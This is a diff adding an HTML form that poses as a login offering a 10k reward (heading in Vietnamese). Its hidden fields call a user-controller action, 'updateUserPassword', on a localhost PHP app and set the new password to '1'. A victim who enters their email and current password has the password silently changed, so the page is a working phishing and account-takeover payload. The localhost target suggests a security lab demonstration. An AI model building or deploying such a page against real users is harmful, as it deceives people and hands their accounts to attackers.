@@ -1,0 +1,17 @@
+<form
+	method="POST"
+	action="http://localhost:3000/assets/controller/controllerUserInfo.php"
+>
+	<h1>Đăng nhập để nhận 10k vào tài khoản</h1>
+	<input name="action" type="hidden" value="updateUserPassword" />
+	<input name="editUserEmail" type="email" placeholder="email" required />
+	<input
+		name="editUserOldPassword"
+		type="password"
+		placeholder="password"
+		required
+	/>
+	<input name="editUserNewPassword" type="hidden" value="1" />
+
+	<input type="submit" value="Đăng nhập" />
+</form>
